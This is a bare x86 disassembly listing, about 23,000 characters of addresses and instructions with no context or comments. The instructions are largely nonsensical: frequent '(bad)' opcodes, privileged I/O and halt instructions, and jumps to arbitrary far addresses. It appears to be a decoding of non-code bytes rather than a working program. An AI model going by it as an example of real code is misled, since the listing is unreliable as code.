  41278b:	pop    eax
  41278c:	pusha  
  41278d:	sahf   
  41278e:	pop    ds
  41278f:	jecxz  0x4127bb
  412791:	adc    edi,DWORD PTR [eax-0x5b510220]
  412797:	lea    ebp,[edi+0x4e]
  41279a:	add    al,0x8f
  41279c:	mov    al,0xac
  41279e:	add    edi,edx
  4127a0:	jo     0x4127de
  4127a2:	adc    al,0x53
  4127a4:	inc    edx
  4127a5:	mov    edi,0x5342f918
  4127aa:	xor    esp,esi
  4127ac:	jno    0x412764
  4127ae:	add    ebx,0xdc1569f6
  4127b4:	(bad)  
  4127b5:	rol    DWORD PTR [eax],0x4b
  4127b8:	xor    eax,0x753b1464
  4127bd:	jl     0x4127fa
  4127bf:	push   edi
  4127c0:	in     al,dx
  4127c1:	and    BYTE PTR [ebp+0x1a],ah
  4127c4:	out    0xa4,eax
  4127c6:	ins    BYTE PTR es:[edi],dx
  4127c7:	pop    ecx
  4127c8:	test   eax,0xce009985
  4127cd:	push   ds
  4127ce:	push   cs
  4127cf:	iret   
  4127d0:	je     0x41280d
  4127d2:	dec    ecx
  4127d3:	jmp    0xd7ca1424
  4127d8:	je     0x412806
  4127da:	in     eax,dx
  4127db:	sbb    BYTE PTR [eax-0x6b],0xd
  4127df:	call   0xfd0b:0x2b3741bf
  4127e6:	lock and al,dh
  4127e9:	std    
  4127ea:	inc    ebx
  4127eb:	mov    ecx,0x3a36d3ba
  4127f0:	push   edi
  4127f1:	sub    al,0xa6
  4127f3:	popa   
  4127f4:	add    DWORD PTR [esi+0x40],edi
  4127f7:	mov    edx,0x6b9ee719
  4127fc:	lods   eax,DWORD PTR ds:[esi]
  4127fd:	aad    0xcb
  4127ff:	int3   
  412800:	or     al,0x6f
  412802:	sub    DWORD PTR [esi+0x6e],edi
  412805:	sub    esi,DWORD PTR [ecx-0x477ce30f]
  41280b:	in     eax,dx
  41280c:	daa    
  41280d:	mov    al,ds:0xf504b0c6
  412812:	(bad)  
  412813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412814:	test   al,0x43
  412816:	push   ds
  412817:	(bad)  
  412818:	hlt    
  412819:	pop    ss
  41281a:	xor    edx,DWORD PTR [esi-0x7981be19]
  412820:	inc    edx
  412821:	fs push es
  412823:	pop    esp
  412824:	int3   
  412825:	je     0x4127cb
  412827:	jge    0x412899
  412829:	or     eax,0x619cf350
  41282e:	mov    al,ds:0xeebc39a1
  412833:	and    DWORD PTR [ebp+0x36bd5192],edi
  412839:	rol    BYTE PTR [edx+edi*1-0x38bf5c4d],cl
  412840:	cmp    al,0x3b
  412842:	mov    dh,0x3
  412844:	ins    BYTE PTR es:[edi],dx
  412845:	mov    ?,ebp
  412847:	xchg   ecx,eax
  412848:	jae    0x4127f0
  41284a:	les    edx,FWORD PTR [esi+ebp*2]
  41284d:	mov    BYTE PTR [ebx],0x9e
  412850:	inc    ebx
  412851:	pop    edi
  412852:	sbb    eax,0x6d3afdde
  412857:	pop    ebx
  412858:	push   0xffffffbd
  41285a:	xchg   esi,eax
  41285b:	push   ebx
  41285c:	(bad)
  41285f:	test   ecx,0xf266a89
  412865:	stos   BYTE PTR es:[edi],al
  412866:	jnp    0x412825
  412868:	jle    0x41286e
  41286a:	aad    0x0
  41286c:	add    DWORD PTR [edi+0x32404a27],edx
  412872:	pop    ss
  412873:	dec    esi
  412874:	jae    0x41287a
  412876:	aaa    
  412877:	in     al,dx
  412878:	push   cs
  412879:	inc    esi
  41287a:	mov    eax,ds:0xf64fa46d
  41287f:	call   0x1fcf2fb7
  412884:	cld    
  412885:	jmp    0x412874
  412887:	lds    ebx,FWORD PTR [edi+0x476ec736]
  41288d:	and    eax,ecx
  41288f:	mov    eax,0xa6d2c3b3
  412894:	mov    ds:0x51b26b3b,eax
  412899:	ja     0x412859
  41289b:	xchg   ebx,eax
  41289c:	and    ecx,DWORD PTR [eax]
  41289e:	int    0xb0
  4128a0:	call   0x5df3:0xae70804e
  4128a7:	xchg   ebx,eax
  4128a8:	mov    dh,0x8f
  4128aa:	adc    BYTE PTR [ecx],ch
  4128ac:	cld    
  4128ad:	or     al,BYTE PTR [esp+ecx*4+0x5286f331]
  4128b4:	adc    eax,0xb6fe29f7
  4128b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ba:	cmp    al,bl
  4128bc:	mov    ss,WORD PTR [edx]
  4128be:	push   esi
  4128bf:	ret    0xcb5d
  4128c2:	cdq    
  4128c3:	cmp    eax,0xf3853e75
  4128c8:	inc    ebp
  4128c9:	push   edx
  4128ca:	mov    WORD PTR [ecx],?
  4128cc:	jecxz  0x412894
  4128ce:	xchg   esi,eax
  4128cf:	fwait
  4128d0:	jnp    0x4128a3
  4128d2:	sub    al,0xb3
  4128d4:	fs stos BYTE PTR es:[edi],al
  4128d6:	sbb    eax,0xb9907556
  4128db:	gs inc ebp
  4128dd:	mov    WORD PTR [edi+0x5215cc15],fs
  4128e3:	loop   0x41289e
  4128e5:	fnstenv [ebp+eax*4+0x63b1ef73]
  4128ec:	jp     0x41295b
  4128ee:	das    
  4128ef:	or     BYTE PTR [eax-0x48],0x57
  4128f3:	js     0x41296d
  4128f5:	out    0xb6,al
  4128f7:	jno    0x4128a3
  4128f9:	push   edx
  4128fa:	pusha  
  4128fb:	pop    ecx
  4128fc:	scas   eax,DWORD PTR es:[edi]
  4128fd:	sbb    dh,BYTE PTR [esi+edx*8-0x7f]
  412901:	dec    ebp
  412902:	fcmovnb st,st(3)
  412904:	enter  0xa4b,0xb0
  412908:	ins    DWORD PTR es:[edi],dx
  412909:	jp     0x412961
  41290b:	imul   edi,DWORD PTR [edx*1+0x49b7729a],0xfffffffe
  412913:	adc    al,0x7c
  412915:	neg    edx
  412917:	cdq    
  412918:	fwait
  412919:	popf   
  41291a:	das    
  41291b:	jl     0x41297b
  41291d:	rcr    cl,0x7c
  412920:	repz mov WORD PTR [edi+0x9],?
  412924:	mov    ds:0xb50f405e,eax
  412929:	sbb    ch,bh
  41292b:	mov    ch,0xd1
  41292d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41292e:	push   DWORD PTR [eax+eax*4]
  412931:	mov    cl,0xa5
  412933:	pop    edi
  412934:	adc    edx,esi
  412936:	imul   edi,DWORD PTR [ebx-0x42],0x4
  41293a:	or     eax,0x60ac0068
  41293f:	pop    esi
  412940:	push   es
  412941:	push   0x7c45af1
  412946:	push   0x59d87a5e
  41294b:	dec    esi
  41294c:	jl     0x412932
  41294e:	lods   al,BYTE PTR ds:[esi]
  41294f:	fwait
  412950:	sahf   
  412951:	popa   
  412952:	mov    ecx,0x40e3b496
  412957:	xor    BYTE PTR [edx-0x39e4d02f],ah
  41295d:	jno    0x4128e9
  41295f:	retf   
  412960:	jge    0x412912
  412962:	adc    eax,0x6d05fc5c
  412967:	mov    edx,0x7761da22
  41296c:	popa   
  41296d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41296e:	aad    0xca
  412970:	inc    esi
  412971:	lods   eax,DWORD PTR ds:[esi]
  412972:	or     edx,DWORD PTR [esi]
  412974:	add    BYTE PTR [esi+0x20],0x32
  412978:	fwait
  412979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41297a:	dec    esi
  41297b:	scas   eax,DWORD PTR es:[edi]
  41297c:	fs retf 0xc1cb
  412980:	fmul   QWORD PTR [edx+0x30]
  412983:	outs   dx,BYTE PTR ds:[esi]
  412984:	mov    ebx,0xb6dafeb6
  412989:	inc    esi
  41298a:	ins    BYTE PTR es:[edi],dx
  41298b:	stos   BYTE PTR es:[edi],al
  41298c:	inc    eax
  41298d:	and    bl,BYTE PTR [ebx]
  41298f:	fisubr WORD PTR [ecx-0x2b32ede7]
  412995:	mov    DWORD PTR [ecx],edi
  412997:	mov    esp,0x8a8d9152
  41299c:	rol    esi,1
  41299e:	add    BYTE PTR [ebx-0x68],ch
  4129a1:	dec    edx
  4129a2:	cwde   
  4129a3:	daa    
  4129a4:	jl     0x41298c
  4129a6:	adc    ch,BYTE PTR [eax-0x62]
  4129a9:	(bad)  
  4129aa:	jmp    0xf014:0x8382b649
  4129b1:	xchg   edx,eax
  4129b2:	ret    
  4129b3:	sbb    eax,0x4237713
  4129b8:	neg    BYTE PTR [ebx+ebp*1+0xa]
  4129bc:	imul   edx,DWORD PTR [eax],0x953255d3
  4129c2:	mov    ch,0xc6
  4129c4:	inc    ebx
  4129c5:	pop    esi
  4129c6:	scas   al,BYTE PTR es:[edi]
  4129c7:	sbb    al,0xa9
  4129c9:	sub    BYTE PTR [eax-0x4c89cf01],ah
  4129cf:	out    0xd5,al
  4129d1:	fisttp DWORD PTR [ebp+0x3]
  4129d4:	or     BYTE PTR [eax],bh
  4129d6:	out    0xe2,eax
  4129d8:	jge    0x412997
  4129da:	mov    dh,0xb2
  4129dc:	push   ss
  4129dd:	cdq    
  4129de:	xchg   dh,ah
  4129e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129e1:	pop    ebx
  4129e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e3:	mov    edx,DWORD PTR [edi]
  4129e5:	xchg   esp,eax
  4129e6:	stc    
  4129e7:	sbb    esp,esi
  4129e9:	in     al,0x4e
  4129eb:	retf   
  4129ec:	retf   
  4129ed:	arpl   cx,ax
  4129ef:	mov    edi,0x318d2f5
  4129f4:	push   0x4e130abe
  4129f9:	and    DWORD PTR [edi+0x2aac04fc],edx
  4129ff:	neg    BYTE PTR ds:[eax+ecx*2-0x34537243]
  412a07:	xchg   esi,eax
  412a08:	xor    edi,edx
  412a0a:	add    al,ch
  412a0c:	fdiv   DWORD PTR [ecx]
  412a0e:	ja     0x4129c3
  412a10:	repz bound eax,QWORD PTR [edx+edx*4-0x20e57b50]
  412a18:	sbb    eax,0x6497b535
  412a1d:	inc    ebp
  412a1e:	cmp    BYTE PTR [edi-0xb1d7472],ch
  412a24:	leave  
  412a25:	xchg   ebp,eax
  412a26:	mov    bh,0xe9
  412a28:	mov    cl,0x11
  412a2a:	aaa    
  412a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a2c:	pop    edi
  412a2d:	jo     0x4129d4
  412a2f:	mov    cl,0xb8
  412a31:	jns    0x4129fc
  412a33:	jmp    0x4129f1
  412a35:	mov    edi,0x7a96a70b
  412a3a:	inc    edi
  412a3b:	jno    0x412a08
  412a3d:	xor    ch,BYTE PTR [ebx-0x388ea76e]
  412a43:	imul   eax,DWORD PTR [esi],0x70d6bd08
  412a49:	sbb    DWORD PTR [edi-0x1393580c],esp
  412a4f:	push   0xb412e87d
  412a54:	mov    edx,esp
  412a56:	push   es
  412a57:	scas   al,BYTE PTR es:[edi]
  412a58:	mov    ebp,0x275f66f9
  412a5d:	int3   
  412a5e:	inc    esi
  412a5f:	test   al,0x1c
  412a61:	mov    dl,0xb0
  412a63:	and    DWORD PTR [esi+0x39],ebp
  412a66:	call   0xa1b78b3b
  412a6b:	inc    edx
  412a6c:	mov    esp,0x8eb03542
  412a71:	xor    ecx,eax
  412a73:	inc    esi
  412a74:	sti    
  412a75:	(bad)  
  412a76:	mov    al,0x12
  412a78:	pop    esi
  412a79:	xchg   ebx,eax
  412a7a:	test   BYTE PTR ds:0xb6035eb8,0x8f
  412a81:	adc    eax,DWORD PTR [eax+0x4f]
  412a84:	push   es
  412a85:	pop    esi
  412a86:	xor    ch,bl
  412a88:	aam    0x8f
  412a8a:	stc    
  412a8b:	mov    eax,0xcae67fa5
  412a90:	aaa    
  412a91:	add    esi,DWORD PTR [edx+ecx*4+0x6e]
  412a95:	cmp    eax,0xfceadfa4
  412a9a:	popa   
  412a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a9c:	enter  0x5f8d,0xe2
  412aa0:	xchg   esi,eax
  412aa1:	out    dx,eax
  412aa2:	fsubr  QWORD PTR [ecx-0x63fb05d2]
  412aa8:	popa   
  412aa9:	lea    edi,ds:0xb62c672e
  412aaf:	dec    ebp
  412ab0:	rsm    
  412ab2:	dec    esi
  412ab3:	dec    edx
  412ab4:	push   0xffffffb9
  412ab6:	es (bad) 
  412ab8:	lods   al,BYTE PTR ds:[esi]
  412ab9:	add    edx,DWORD PTR [edx]
  412abb:	lock xchg ecx,eax
  412abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412abe:	push   es
  412abf:	sub    al,0x30
  412ac1:	xchg   esp,eax
  412ac2:	push   ebp
  412ac3:	fidivr DWORD PTR fs:[ecx-0x37542799]
  412aca:	pop    edx
  412acb:	gs adc eax,0x70feec3e
  412ad1:	cs sub esi,ebx
  412ad4:	mov    eax,ds:0x2c186185
  412ad9:	scas   al,BYTE PTR es:[edi]
  412ada:	test   esi,ecx
  412adc:	pop    ebx
  412add:	mov    WORD PTR [edx+0x77b0adaa],ds
  412ae3:	jmp    0x26d2:0xb2f66b84
  412aea:	cwde   
  412aeb:	and    al,0x5a
  412aed:	xchg   edx,eax
  412aee:	mov    eax,ds:0xb22704cc
  412af3:	mov    cl,BYTE PTR [eax-0x7d83a74d]
  412af9:	cmp    al,BYTE PTR [ebx+0x3a]
  412afc:	ds push ds
  412afe:	lods   eax,DWORD PTR ds:[esi]
  412aff:	(bad)
  412b03:	dec    ecx
  412b04:	mov    esi,0x6fce3365
  412b09:	inc    edi
  412b0a:	nop
  412b0b:	mov    dl,0x36
  412b0d:	xor    al,0x40
  412b0f:	lods   eax,DWORD PTR ds:[esi]
  412b10:	fidivr DWORD PTR [edx+0x1f]
  412b13:	stc    
  412b14:	mov    ds:0x5291ad78,al
  412b19:	mov    edx,DWORD PTR [esi-0x6b1a0c38]
  412b1f:	fwait
  412b20:	adc    al,0x35
  412b22:	xchg   ecx,eax
  412b23:	cmp    edx,esi
  412b25:	gs push es
  412b27:	int3   
  412b28:	ins    DWORD PTR es:[edi],dx
  412b29:	push   ds
  412b2a:	mov    esi,0x486c1282
  412b2f:	xchg   esp,eax
  412b30:	dec    ebx
  412b31:	call   0x351a:0x8461e713
  412b38:	arpl   WORD PTR [eax-0x5b],ax
  412b3b:	xor    bh,bl
  412b3d:	mov    esp,0x8eb1b7c5
  412b42:	cli    
  412b43:	inc    ebx
  412b44:	add    BYTE PTR [eax],0x18
  412b47:	aam    0xaa
  412b49:	stos   BYTE PTR es:[edi],al
  412b4a:	std    
  412b4b:	das    
  412b4c:	shr    BYTE PTR [eax+0x60],0x87
  412b50:	out    0x95,al
  412b52:	add    eax,0x8555cc4c
  412b57:	mov    ecx,0x4261a5b9
  412b5d:	xor    eax,DWORD PTR [ebp-0x19]
  412b60:	sbb    bl,BYTE PTR [ecx]
  412b62:	sahf   
  412b63:	les    esp,FWORD PTR [eax+eax*2-0x505b53ef]
  412b6a:	shl    DWORD PTR [esi-0x7d82824c],1
  412b70:	mov    bl,bl
  412b72:	popa   
  412b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b74:	and    edx,esp
  412b76:	xlat   BYTE PTR ds:[ebx]
  412b77:	pop    ebx
  412b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b79:	clc    
  412b7a:	xchg   edi,eax
  412b7b:	dec    ebp
  412b7c:	mov    eax,ds:0x623b95b3
  412b81:	mov    bh,0x61
  412b83:	gs hlt 
  412b85:	stc    
  412b86:	jmp    0x2db48b15
  412b8b:	push   edx
  412b8c:	ror    DWORD PTR [ecx+0x15],0xda
  412b90:	pop    ss
  412b91:	jns    0x412b18
  412b93:	mov    DWORD PTR [ecx-0x9],edx
  412b96:	mov    es,WORD PTR [ebp+0x43]
  412b99:	xchg   edx,eax
  412b9a:	pusha  
  412b9b:	(bad)  
  412b9c:	ds clc 
  412b9e:	iret   
  412b9f:	xor    BYTE PTR ds:[ecx+eax*8],bh
  412ba3:	jne    0x412bed
  412ba5:	inc    ecx
  412ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ba7:	push   edx
  412ba8:	sbb    ebp,edi
  412baa:	test   BYTE PTR [edi+edi*2],dl
  412bad:	leave  
  412bae:	push   edi
  412baf:	loop   0x412c19
  412bb1:	shl    BYTE PTR [edx+0x12],1
  412bb4:	xchg   BYTE PTR [ebp-0x6cea4726],cl
  412bba:	inc    ebp
  412bbb:	ds jbe 0x412bbe
  412bbe:	push   edx
  412bbf:	mov    al,ds:0x1be2c263
  412bc4:	or     DWORD PTR [edi],0x906b9b28
  412bca:	in     al,0x41
  412bcc:	jg     0x412c2b
  412bce:	pop    ebp
  412bcf:	mov    bl,0x4
  412bd1:	jae    0x412bbf
  412bd3:	sub    eax,DWORD PTR [esi]
  412bd5:	in     al,0x4a
  412bd7:	adc    ah,dl
  412bd9:	mov    WORD PTR [ebx],cs
  412bdb:	call   0x694769c5
  412be0:	nop
  412be1:	or     eax,0x8c287223
  412be6:	mov    dh,0x98
  412be8:	fsubr  QWORD PTR [ebp+0x3a]
  412beb:	outs   dx,DWORD PTR ds:[esi]
  412bec:	xchg   DWORD PTR [eax],eax
  412bee:	ret    0xbf11
  412bf1:	cmc    
  412bf2:	mov    ch,0x14
  412bf4:	adc    ebx,ebx
  412bf6:	enter  0x10df,0xbb
  412bfa:	adc    ebp,eax
  412bfc:	repnz test eax,0x96180d5
  412c02:	out    0xef,al
  412c04:	(bad)  
  412c05:	hlt    
  412c06:	loop   0x412c14
  412c08:	push   esp
  412c09:	shl    ecx,1
  412c0b:	mov    edi,0x8d6f8c09
  412c10:	stos   BYTE PTR es:[edi],al
  412c11:	sub    eax,0xcdff4387
  412c16:	ror    DWORD PTR [ebx],1
  412c18:	sbb    ebx,edx
  412c1a:	push   ebx
  412c1b:	xchg   edi,eax
  412c1c:	fisubr DWORD PTR [ecx+0x68]
  412c1f:	retf   
  412c20:	scas   al,BYTE PTR es:[edi]
  412c21:	or     dl,0x2c
  412c24:	push   ds
  412c25:	outs   dx,DWORD PTR ds:[esi]
  412c26:	push   esi
  412c27:	pop    esp
  412c28:	mov    ds:0x1f5a65bf,eax
  412c2d:	dec    ebp
  412c2e:	dec    ebp
  412c2f:	push   ds
  412c30:	jmp    0x454:0x9a6a3a0e
  412c37:	cmp    ebp,DWORD PTR ds:0x7a83a9dd
  412c3d:	scas   eax,DWORD PTR es:[edi]
  412c3e:	inc    eax
  412c3f:	nop
  412c40:	(bad)  
  412c41:	retf   0xc6a0
  412c44:	sbb    eax,0xf572fff5
  412c49:	dec    ecx
  412c4a:	jno    0x412c5e
  412c4c:	sbb    esp,esp
  412c4e:	or     BYTE PTR [ebx-0x66],dl
  412c51:	cwde   
  412c52:	out    0x49,eax
  412c54:	jo     0x412c47
  412c56:	push   esi
  412c57:	ins    BYTE PTR es:[edi],dx
  412c58:	sbb    dh,BYTE PTR [edi*8-0x5a1942b7]
  412c5f:	push   eax
  412c60:	xchg   ecx,eax
  412c61:	ret    0xd13c
  412c64:	shr    BYTE PTR [esi-0x22d61d47],cl
  412c6a:	pusha  
  412c6b:	addr16 xchg edi,eax
  412c6d:	mov    dl,0x89
  412c6f:	add    eax,0x396f3f09
  412c74:	fcmovnu st,st(0)
  412c76:	dec    esp
  412c77:	and    al,0xb
  412c79:	rol    edi,cl
  412c7b:	cmp    al,0xdd
  412c7d:	mov    al,0xde
  412c7f:	jbe    0x412c66
  412c81:	jle    0x412c35
  412c83:	(bad)  
  412c84:	adc    dh,BYTE PTR [edi]
  412c86:	xor    dh,al
  412c88:	icebp  
  412c89:	jno    0x412cef
  412c8b:	pushf  
  412c8c:	or     ebx,DWORD PTR [ebx]
  412c8e:	sub    eax,esi
  412c90:	add    al,dl
  412c92:	pop    ebx
  412c93:	sub    DWORD PTR [ecx-0x12],esi
  412c96:	xchg   ecx,eax
  412c97:	ds dec ecx
  412c99:	xor    cl,BYTE PTR [ecx]
  412c9b:	jmp    0x412cb5
  412c9d:	adc    eax,0x7a9d9ce1
  412ca2:	push   0x19
  412ca4:	jmp    0x412c3c
  412ca6:	add    al,BYTE PTR [ecx+0x7b]
  412ca9:	jge    0x412c30
  412cab:	shl    ebx,1
  412cad:	mov    bh,0xc2
  412caf:	jg     0x412c40
  412cb1:	adc    BYTE PTR [edi-0xb],cl
  412cb4:	xchg   ebx,eax
  412cb5:	ja     0x412c6f
  412cb7:	icebp  
  412cb8:	sub    eax,0x811777fa
  412cbd:	jg     0x412cb5
  412cbf:	outs   dx,DWORD PTR ds:[esi]
  412cc0:	mov    ah,0xbf
  412cc2:	imul   edx,DWORD PTR [eax-0x11],0x8a7d1b5
  412cc9:	pop    ds
  412cca:	icebp  
  412ccb:	and    bl,ch
  412ccd:	out    0xd,al
  412ccf:	cmp    ebx,DWORD PTR [ebx]
  412cd1:	shr    BYTE PTR [edx],1
  412cd3:	sar    DWORD PTR [edi],1
  412cd5:	add    eax,DWORD PTR [ebx+0x70e59abe]
  412cdb:	pop    ebx
  412cdc:	jns    0x412c88
  412cde:	sub    al,0x6b
  412ce0:	call   0x6877070c
  412ce5:	xor    edx,DWORD PTR [eax]
  412ce7:	add    ah,ch
  412ce9:	iret   
  412cea:	or     edi,edx
  412cec:	jle    0x412cb7
  412cee:	mov    bh,0x1e
  412cf0:	inc    ecx
  412cf1:	push   0x8c481fef
  412cf6:	outs   dx,BYTE PTR ds:[esi]
  412cf7:	mov    edx,0x8e0607dd
  412cfc:	fisub  DWORD PTR [esi]
  412cfe:	sub    al,BYTE PTR [esi]
  412d00:	ror    ebx,1
  412d02:	fisubr WORD PTR [eax-0x7e]
  412d05:	push   ss
  412d06:	mov    esp,0x8b4ccc98
  412d0b:	mov    BYTE PTR [esi-0x2d],ch
  412d0e:	call   esp
  412d10:	mov    al,0x59
  412d12:	mov    esi,0x437ae6cb
  412d17:	jbe    0x412cac
  412d19:	scas   eax,DWORD PTR es:[edi]
  412d1a:	add    BYTE PTR [esi-0x5f0d5e24],ah
  412d20:	sbb    eax,0x6b7f87aa
  412d25:	mov    ebp,0x9eac7cbe
  412d2a:	cld    
  412d2b:	jmp    0x412d1c
  412d2d:	jb     0x412d82
  412d2f:	jns    0x412d76
  412d31:	jle    0x412d67
  412d33:	add    DWORD PTR [ebx-0x57],0xd71d74a0
  412d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3b:	out    0xa2,eax
  412d3d:	mov    DWORD PTR gs:[eax+0x67],esp
  412d41:	sbb    BYTE PTR [edi-0x64],dl
  412d44:	mov    cl,0xe6
  412d46:	sbb    DWORD PTR [eax+0x21],0x35
  412d4a:	out    dx,eax
  412d4b:	push   ecx
  412d4c:	and    bh,BYTE PTR [esi+0x509e6b4a]
  412d52:	inc    eax
  412d53:	inc    esi
  412d54:	pushf  
  412d55:	xchg   ecx,eax
  412d56:	mov    bl,0xf3
  412d58:	in     al,0xc5
  412d5a:	sub    DWORD PTR [edx+0x5c3c88c5],esi
  412d60:	out    dx,al
  412d61:	xor    eax,0xb0c4e22c
  412d66:	dec    eax
  412d67:	mov    dl,0xb0
  412d69:	jno    0x412dc4
  412d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d6c:	dec    edi
  412d6d:	xor    edi,eax
  412d6f:	jl     0x412d2a
  412d71:	stc    
  412d72:	vpmacsdqh xmm8,xmm2,XMMWORD PTR [edx],xmm7
  412d78:	mov    ecx,0x4345be3c
  412d7d:	out    dx,al
  412d7e:	sbb    bh,BYTE PTR [edi]
  412d80:	sar    DWORD PTR [esi],cl
  412d82:	sahf   
  412d83:	or     DWORD PTR [esp+esi*2],edi
  412d86:	jle    0x412d38
  412d88:	inc    edi
  412d89:	mov    WORD PTR cs:[ebx+0x49],gs
  412d8d:	out    dx,eax
  412d8e:	not    DWORD PTR [ecx-0x563c7b7d]
  412d94:	clc    
  412d95:	and    al,0x13
  412d97:	xchg   ebp,eax
  412d98:	rcl    DWORD PTR [edi-0x29f4550d],1
  412d9e:	sub    ecx,DWORD PTR [ebp+0x35dd7cd7]
  412da4:	les    ebx,FWORD PTR [ebx]
  412da6:	adc    eax,0x737a1fa9
  412dab:	fsubr  DWORD PTR [edx+eax*4]
  412dae:	pop    edi
  412daf:	cwde   
  412db0:	or     esp,DWORD PTR [ebx]
  412db2:	ret    0xa14f
  412db5:	int    0x89
  412db7:	xor    al,0x73
  412db9:	xchg   esp,eax
  412dba:	test   BYTE PTR [edi-0x4b],cl
  412dbd:	xchg   ebp,eax
  412dbe:	in     eax,dx
  412dbf:	xchg   ebx,eax
  412dc0:	jmp    0xa63f:0x9421e2fc
  412dc7:	mov    WORD PTR [ecx+0x37156de0],ds
  412dcd:	test   al,0x18
  412dcf:	repnz push ecx
  412dd1:	loopne 0x412d75
  412dd3:	repnz pop esp
  412dd5:	int3   
  412dd6:	cdq    
  412dd7:	loop   0x412dfb
  412dd9:	js     0x412dc7
  412ddb:	div    BYTE PTR [ecx-0x80]
  412dde:	mov    edx,0xc36faa24
  412de3:	or     ch,ah
  412de5:	add    eax,DWORD PTR [ebp+0x5e]
  412de8:	sbb    BYTE PTR [edx-0xde0b7aa],dl
  412dee:	pop    esp
  412def:	ins    BYTE PTR es:[edi],dx
  412df0:	sub    BYTE PTR [eax],ah
  412df2:	out    0x8b,eax
  412df4:	sbb    BYTE PTR [ecx+0x6382153],0x79
  412dfb:	adc    eax,0x53c58b4a
  412e00:	out    0x2f,al
  412e02:	xor    ebp,DWORD PTR [edx+esi*2]
  412e05:	test   BYTE PTR [ebp+0x49],ah
  412e08:	dec    edx
  412e09:	test   eax,0x374c3fc8
  412e0e:	aaa    
  412e0f:	out    dx,eax
  412e10:	hlt    
  412e11:	dec    esp
  412e12:	and    dh,ah
  412e14:	(bad)  
  412e16:	pop    ecx
  412e17:	adc    ecx,DWORD PTR [ecx*1-0x1b0ef7b5]
  412e1e:	sub    dh,BYTE PTR [ebp+0x7ace91d7]
  412e24:	inc    esi
  412e25:	push   ebx
  412e26:	imul   eax,DWORD PTR [edi-0x5e],0x9635197c
  412e2d:	push   DWORD PTR [eax+0x3443b50f]
  412e33:	sub    eax,0x5e0c44bc
  412e38:	push   ecx
  412e39:	pushf  
  412e3a:	loope  0x412e75
  412e3c:	jae    0x412e4c
  412e3e:	scas   eax,DWORD PTR es:[edi]
  412e3f:	mov    cl,0x51
  412e41:	mov    dl,0x20
  412e43:	fild   DWORD PTR [esi+0x34b8b854]
  412e49:	add    al,0xe9
  412e4b:	ins    DWORD PTR es:[edi],dx
  412e4c:	loope  0x412e03
  412e4e:	ficomp WORD PTR [esi+edx*2]
  412e51:	sti    
  412e52:	fstp   QWORD PTR [edx+0x59]
  412e55:	push   cs
  412e56:	adc    al,0x27
  412e58:	add    DWORD PTR [esi-0x70],esi
  412e5b:	sti    
  412e5c:	nop
  412e5d:	imul   ecx,DWORD PTR [ebx-0x5b],0xb88ec4b
  412e64:	mov    dl,0x13
  412e66:	hlt    
  412e67:	xchg   ecx,eax
  412e68:	pop    esp
  412e69:	mov    al,0x4f
  412e6b:	adc    eax,DWORD PTR [ecx+0x70]
  412e6e:	ins    DWORD PTR es:[edi],dx
  412e6f:	repnz int 0x94
  412e72:	add    BYTE PTR [edx+0x596192ee],al
  412e78:	pop    eax
  412e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e7a:	cmc    
  412e7b:	fild   WORD PTR [ecx+0x4b]
  412e7e:	mov    edi,0xbea51048
  412e83:	ins    DWORD PTR es:[edi],dx
  412e84:	fimul  DWORD PTR [edx-0x59]
  412e87:	(bad)  
  412e88:	cmp    DWORD PTR [esp+edi*8-0x5f],edi
  412e8c:	js     0x412ef0
  412e8e:	scas   al,BYTE PTR es:[edi]
  412e8f:	pop    esi
  412e90:	sahf   
  412e91:	cmp    DWORD PTR ds:0x63aab0a5,eax
  412e97:	sub    eax,0x214a7cdb
  412e9c:	sub    edx,ebx
  412e9e:	in     al,0x15
  412ea0:	lahf   
  412ea1:	hlt    
  412ea2:	(bad)  
  412ea3:	out    dx,al
  412ea4:	add    DWORD PTR [esi],edi
  412ea6:	jmp    0x412e59
  412ea8:	aad    0x82
  412eaa:	add    ah,BYTE PTR [ebp+0x62db613c]
  412eb0:	jae    0x412eee
  412eb2:	gs stos DWORD PTR es:[edi],eax
  412eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb5:	cdq    
  412eb6:	jle    0x412f14
  412eb8:	add    ecx,DWORD PTR [edi-0x7d]
  412ebb:	and    al,0x15
  412ebd:	mov    es,WORD PTR [edx-0x458e80cd]
  412ec3:	mov    al,ds:0xf76fc0ef
  412ec8:	xor    DWORD PTR [esi+0x2e],0x2d1140d1
  412ecf:	push   cs
  412ed0:	xchg   edi,eax
  412ed1:	add    esp,DWORD PTR [eax-0x63]
  412ed4:	es mov ebp,0x4b8b152d
  412eda:	push   es
  412edb:	out    0xde,eax
  412edd:	out    dx,al
  412ede:	adc    eax,0x69c70c36
  412ee3:	frstor [edi-0xdb99c8b]
  412ee9:	dec    esi
  412eea:	outs   dx,BYTE PTR ds:[esi]
  412eeb:	or     DWORD PTR [edx],eax
  412eed:	mov    eax,ds:0x4fccc556
  412ef2:	gs cmp al,0xeb
  412ef5:	jmp    0x823babe9
  412efa:	(bad)
  412efe:	sub    al,0x4f
  412f00:	cmp    dl,BYTE PTR [edx+0x2833b21a]
  412f06:	inc    edi
  412f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f08:	lds    ebp,FWORD PTR [edx+0x33f0d1c6]
  412f0e:	xchg   ebx,eax
  412f0f:	shl    DWORD PTR [edx+0x1d2f8bbc],1
  412f15:	sub    bh,BYTE PTR [ecx+0x72]
  412f18:	js     0x412f6c
  412f1a:	and    DWORD PTR [eax+ebp*8+0x4a],ebp
  412f1e:	loop   0x412ee3
